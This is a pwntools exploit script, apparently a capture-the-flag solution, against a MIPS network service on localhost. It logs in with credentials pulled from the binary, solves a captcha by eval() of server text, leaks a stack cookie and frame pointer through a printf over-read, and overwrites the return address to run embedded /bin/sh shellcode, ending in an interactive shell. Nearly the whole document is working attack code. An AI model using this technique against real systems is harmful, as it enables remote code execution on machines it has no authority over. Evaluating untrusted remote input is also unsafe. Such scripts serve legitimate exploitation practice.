from pwn import *

# step 0 - analysis
# we can write shellcode instead of city name (enough space)
# vulnerable read function - it read more than variable we can overwrite ra and
# jump to shellcode (nx disabled)
# stack cookies enabled - we should leak it
# and we can leak fp to calculate offset to shellcode
# with gdb we can find structure of vulnerable function auth
# [8 captcha] [10 password] [2 junk] [4 stack cookie] [16 junk] [4 fp] [4 ra]
#

context.log_level = 'debug'
host = "localhost"
port = 32775
# public shellcode for mips
shellcode="\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh\x00"
offset = 44 #offset to ra
offset_to_fp = 40 #offset to fp
offset_to_stack_cookie = 21 #offset to sc
offset_from_fp_to_channels = 32 #offset to shellcode from fp

p = remote(host, port)

# step 1 auth (username password from binary) for writing exploit
user = "admin" # from binary
passw = "h$bavb124" # from binary
p.recvuntil("Select option:")
p.sendline("4")
p.sendline(user)
p.sendline(passw)
p.recvuntil("Captcha:")
expression = p.recvuntil("=")[:-1]
p.sendline(str(eval(expression)))
p.recvuntil("option:")

# step 2 locate shellcode
p.sendline("2")
p.sendline("0")
p.sendline(shellcode)

# step 3 read stack cookie
p.recvuntil("Select option:")
p.sendline("4") #from binary
p.sendline("aaa") #username
p.sendline("aaa") #password
p.recvuntil("Captcha:")
p.send("A"*offset_to_stack_cookie) #overwrite last 00 to read stack cookie (printf print until \x00)
p.recvuntil("A"*offset_to_stack_cookie) # drop first junk
cookie = p.recv(3) # 3 bytes cookie after junk

# step 4 read fp to calc offset to  our shellcode
p.recvuntil("Username:")
p.sendline("aaa") #username
p.sendline("aaa") #password
p.recvuntil("Captcha:")
p.send("A"*(offset_to_fp))
p.recvuntil("A"*(offset_to_fp))
fp = p.recv(4)#  4 bytes after junk - fp

ra = p32(u32(fp)+offset_from_fp_to_channels) # addr of shellcode

# step 5 now we can execute it finally
p.recvuntil("Username:")
p.sendline("admin")
p.sendline("h$bavb124")
p.recvuntil("Captcha:")
expression = p.recvuntil("=")[:-1]
expression = str(eval(expression))
# we send correct captcha correct stack cookie and overwrite ra
payload = expression+b'\x00'+"A"*(7-len(expression))+passw+b'\x00'+"A"*2+b'\x00'+cookie+"JUNK"*5+ra
p.sendline(payload)
p.interactive()
